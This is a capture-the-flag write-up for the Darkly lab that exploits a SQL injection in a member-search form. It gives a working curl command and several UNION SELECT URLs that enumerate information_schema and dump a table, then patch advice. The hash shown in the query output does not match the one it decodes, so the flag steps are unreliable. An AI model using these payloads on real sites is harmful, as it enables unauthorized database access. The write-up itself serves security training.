# SQL Injection

## Exploit

On the /?page=member page, an incorrect input validation of the “Search member by ID” form transforms it into an attack vector for sql injections.

By making the following request :

`curl -s "http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20title,comment%20FROM%20Member_images.list_images&Submit=Submit#" | grep flag | sed 's/.*\(Hack.*\)/\1/'`

We obtain the following result:

`Hack me ?<br>Surname : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46</pre><table width=50%>`

[md5.gromweb.com](https://md5.gromweb.com/) 5ff9d0165b4f92b14994e5c685cdce28 => albatroz

`echo -n "albatroz"  | tr '[:upper:]' '[:lower:]' | openssl dgst -sha256 | awk '{print $2}'`

### Requests used during database enumeration:

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_SCHEMA,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME%20FROM%20information_schema.columns&Submit=Submit#

http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20title,comment%20FROM%20Member_images.list_images&Submit=Submit#


## Patch

- Avoid use of dynamic queries with string concatenation
- Prevent malicious SQL input from being included in executed queries
- Input validation and sanitize all inputs (not only web forms)
- Turn off the visibility of database errors

## Resources

[OWASP SQL INJECTION](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
